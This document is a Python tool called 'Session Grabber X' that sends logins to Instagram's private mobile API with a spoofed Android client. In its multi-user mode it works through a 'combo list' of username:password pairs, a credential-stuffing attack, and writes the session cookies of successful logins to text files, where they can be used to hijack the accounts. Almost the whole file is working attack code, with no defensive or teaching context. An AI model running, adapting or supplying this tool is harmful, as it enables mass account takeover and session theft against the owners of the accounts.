import subprocess
import time
import random
import os
import requests
import uuid
import random
import base64
import os
import string
import time
from time import sleep
import sys

try:
    import pyperclip
except ModuleNotFoundError:
    subprocess.run(['cmd', '/c', 'pip', 'install', 'pyperclip'])
    import pyperclip

try:
    import requests
except ModuleNotFoundError:
    subprocess.run(['cmd', '/c', 'pip', 'install', 'requests'])
    import requests


def main():
    os.system("color F0")
    def clearConsle(): return os.system('cls')
    def clearTermnal(): return os.system('cls')
    spacee = '       '
    sgrabberx = f'{spacee}[ Session Grabber X ] - '
    banner = """

   _____                _                ______           __    __                 _  __
  / ___/___  __________(_)___  ____     / ____/________ _/ /_  / /_  ___  _____   | |/ /
  \__ \/ _ \/ ___/ ___/ / __ \/ __ \   / / __/ ___/ __ `/ __ \/ __ \/ _ \/ ___/   |   / 
 ___/ /  __(__  |__  ) / /_/ / / / /  / /_/ / /  / /_/ / /_/ / /_/ /  __/ /      /   |  
/____/\___/____/____/_/\____/_/ /_/   \____/_/   \__,_/_.___/_.___/\___/_/      /_/|_|  
                                                                                        

    """
    os.system("cls")
    os.system("title Session Grabber X")
    print(f'{banner}')
    time.sleep(1)
    SingleOrMulti = input(
        f"{sgrabberx}Press 1 for Single User Session Grabber\n{sgrabberx}Press 2 for Multi User Session Grabber\n{sgrabberx}Press 3 to Exit.\n{sgrabberx}Option : ")
    if "1" in SingleOrMulti:
        singlesessionsx = []
        usernamex = input(f"{sgrabberx}Username? : ")
        passwordx = input(f"{sgrabberx}Password? : ")
        url = "https://i.instagram.com/api/v1/accounts/login/"
        payload = {
            'username': {usernamex},
            'device_id': f'android-JDS{random.randint(557585865, 59556874783487696589)}',
            'password': {passwordx}
        }
        headers = {
            'Accept': '/',
            'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept-Language': 'en-US',
            'User-Agent': "Instagram 85.0.0.21.100 Android (28/9; 380dpi; 1080x2147; OnePlus; HWEVA; OnePlus6T; qcom; en_US; 146536611)"
        }
        response = requests.post(url, headers=headers, data=payload)
        if response.status_code != 200:
            print(
                f"{sgrabberx}Failed to grab session.\n{sgrabberx}Possible reasons include, Wrong Info, Account Has 2FA, Suspicious Login, Rate Limited.")
            input(f"{sgrabberx}Press enter to retry.")
            main()
        if response.status_code == 200:
            singlesessionsx.append(
                str(response.cookies.get_dict()['sessionid']))
            for id in singlesessionsx:
                print(f"{sgrabberx}{id}")
                pyperclip.copy(f'{id}')
                print(f'{sgrabberx}Finished and copied session ID to clipboard.')
        makefile = input(
            f"{sgrabberx}Make a txt file with session? (y/n) : ")
        if "y" in makefile:
            writer = open(f"session {usernamex}.txt", "a")
            writer.write(f"{id}")
            print(f'{sgrabberx}Made txt file.')
            input(f"{sgrabberx}Press enter to go back to home page.")
            os.system("cls")
            main()
        if "n" in makefile:
            print(f'{sgrabberx}Finished.')
            time.sleep(1)
            input(f"{sgrabberx}Press enter to go back to home page.")
            os.system("cls")
            main()
            print(
                f'{sgrabberx}Session grabbed {len(singlesessionsx)}', end='\r')

    if "2" in SingleOrMulti:
        session_file = input(f"{sgrabberx}Enter combo list file path: ")
        opened_session_file = open(session_file, "r").readlines()
        session_id_list = []
        for line in opened_session_file:
            url = "https://i.instagram.com/api/v1/accounts/login/"
            payload = {
                'username': line.rstrip().split(':')[0],
                'device_id': f'android-JDS{random.randint(557585865, 59556874783487696589)}',
                'password': line.rstrip().split(':')[1]
            }
            headers = {
                'Accept': '/',
                'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Accept-Language': 'en-US',
                'User-Agent': "Instagram 85.0.0.21.100 Android (28/9; 380dpi; 1080x2147; OnePlus; HWEVA; OnePlus6T; qcom; en_US; 146536611)"
            }
            response = requests.post(url, headers=headers, data=payload)
            if response.status_code == 200:
                session_id_list.append(
                    str(response.cookies.get_dict()['sessionid']))
                print(
                    f'{sgrabberx}Sessions grabbed {len(session_id_list)}', end='\r')
            time.sleep(1)
        writer = open(f"sessions {int(time.time())}.txt", "a")
        for id in session_id_list:
            print(f"{sgrabberx}{id}\n")
            writer.write(f"{id}\n")
        print(f'{sgrabberx}Finished.')
        time.sleep(1)
        input(f"{sgrabberx}Press enter to go back to home page.")
        os.system("cls")
        main()
    if "3" in SingleOrMulti:
        exit()
    else:
        main()


main()
